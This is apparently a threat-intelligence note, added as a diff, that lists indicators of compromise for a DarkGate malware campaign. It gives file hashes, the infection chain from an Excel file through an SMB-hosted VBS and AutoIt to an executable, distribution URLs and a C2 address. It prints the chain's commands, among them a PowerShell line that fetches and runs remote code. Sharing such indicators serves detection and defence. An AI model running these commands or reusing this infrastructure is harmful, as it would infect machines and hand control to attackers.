@@ -1,0 +1,36 @@
+09.04.2024 | Darkgate | admin888
+
+*************************************************
+
+.url file://45.89.53.187/s/MS_EXCEL_AZURE_CLOUD_OPEN_DOCUMENT.vbs
+.xls 12018c2af0600fc1f1a75842a1d4f7777001fadb65f93125e479ec9b949e1773
+.vbs 2e34908f60502ead6ad08af1554c305b88741d09e36b2c24d85fd9bac4a11d2f
+
+*************************************************
+
+xlsx > smb > vbs > au3 > exe
+
+EXCEL.EXE "C:\Users\Admin\AppData\Local\Temp\statapril2024-1382.xlsx
+
+WScript.exe \\45.89.53.187\s\MS_EXCEL_AZURE_CLOUD_OPEN_DOCUMENT.vbs
+
+powershell.exe -Command Invoke-Expression (Invoke-RestMethod -Uri '103.124.106.237/wctaehcw')
+
+AutoHotkey.exe C:/kady/script.ahk 
+
+attrib.exe +h C:/kady/
+
+*************************************************
+
+distro urls
+
+http://103.124.106.237/wctaehcw
+http://103.124.106.237/gsgqmjivmr
+http://103.124.106.237/rjlcmdey
+http://103.124.106.237/giibkqxo
+
+*************************************************
+
+c2
+
+http://94.228.169.143:2351
